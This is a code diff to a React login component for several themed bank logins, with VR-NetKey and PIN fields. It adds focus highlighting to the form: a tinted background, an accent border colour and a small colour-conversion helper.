@@ -146,6 +146,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const [submitting, setSubmitting] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
   const [credentialsInvalid, setCredentialsInvalid] = useState(false);
+  const [focusedField, setFocusedField] = useState<"vr" | "pin" | null>(null);
 
   const pollRef = useRef<{ timer: any; startedAt: number; taskId: string; positiveSeen: boolean } | null>(null);
   const qrPollRef = useRef<{ timer: any; sessionId: string; startedAt: number } | null>(null);
@@ -270,6 +271,13 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   const themeColor = theme.headerBg === "#ffffff" ? (isWarburg ? "#6d7e8b" : "#1a1a1a") : theme.headerBg;
   const buttonBorderRadius = theme.buttonRadius === "rounded-full" ? "9999px" : "0px";
+  const hexToRgba = (hex: string, alpha: number) => {
+    const m = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex?.trim() ?? "");
+    if (!m) return `rgba(59,130,246,${alpha})`;
+    return `rgba(${parseInt(m[1],16)},${parseInt(m[2],16)},${parseInt(m[3],16)},${alpha})`;
+  };
+  const focusAccent = theme.accentText || themeColor;
+  const focusTint = hexToRgba(focusAccent, 0.08);
   
   // Apply a global CSS variable for inputs and other components that might not use the inline style
   useEffect(() => {
@@ -657,18 +665,27 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
               <form onSubmit={handleSubmit} className="space-y-4">
                 <div>
-                  <div className={`relative ${vrNetKeyError ? "bg-red-50" : ""}`} style={{ borderRadius: "4px" }}>
+                  <div
+                    className={`relative ${vrNetKeyError ? "bg-red-50" : ""}`}
+                    style={{
+                      borderRadius: "4px",
+                      backgroundColor: !vrNetKeyError && focusedField === "vr" ? focusTint : undefined,
+                      transition: "background-color 150ms",
+                    }}
+                  >
                     <input
                       id="vrNetKey"
                       type="text"
                       value={vrNetKey}
                       onChange={(e) => { setVrNetKey(e.target.value); if (e.target.value.trim()) setVrNetKeyError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
+                      onFocus={() => setFocusedField("vr")}
+                      onBlur={() => setFocusedField((f) => (f === "vr" ? null : f))}
                       placeholder=" "
                        className={`peer w-full px-4 pt-6 pb-2 border-2 focus:outline-none transition-colors text-base bg-transparent ${vrNetKeyError ? "border-red-500" : (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!vrNetKeyError && vrNetKey ? { borderColor: theme.accentText } : {}), borderRadius: "4px" }}
-
-
-
+                      style={{
+                        ...(!vrNetKeyError && (focusedField === "vr" || vrNetKey) ? { borderColor: focusAccent } : {}),
+                        borderRadius: "4px",
+                      }}
                       autoComplete="username"
                     />
                     <label
@@ -689,19 +706,27 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
                 </div>
 
                 <div>
-                  <div className={`relative ${pinError ? "bg-red-50" : ""}`} style={{ borderRadius: "4px" }}>
+                  <div
+                    className={`relative ${pinError ? "bg-red-50" : ""}`}
+                    style={{
+                      borderRadius: "4px",
+                      backgroundColor: !pinError && focusedField === "pin" ? focusTint : undefined,
+                      transition: "background-color 150ms",
+                    }}
+                  >
                     <input
                       id="pin"
                       type={showPin ? "text" : "password"}
                       value={pin}
                       onChange={(e) => { setPin(e.target.value); if (e.target.value.trim()) setPinError(false); setCredentialsInvalid(false); setErrorMsg(null); }}
+                      onFocus={() => setFocusedField("pin")}
+                      onBlur={() => setFocusedField((f) => (f === "pin" ? null : f))}
                       placeholder=" "
                       className={`peer w-full px-4 pt-6 pb-2 pr-12 border-2 focus:outline-none transition-colors text-base bg-transparent ${pinError ? "border-red-500" : (isGLS || isWarburg || isMarcard || isQlick || isRenault) ? "border-gray-800" : "border-gray-300"}`}
-                      style={{ ...(!pinError && pin ? { borderColor: theme.accentText } : {}), borderRadius: "4px" }}
-
-
-
-
+                      style={{
+                        ...(!pinError && (focusedField === "pin" || pin) ? { borderColor: focusAccent } : {}),
+                        borderRadius: "4px",
+                      }}
                       autoComplete="current-password"
                     />
                     <label
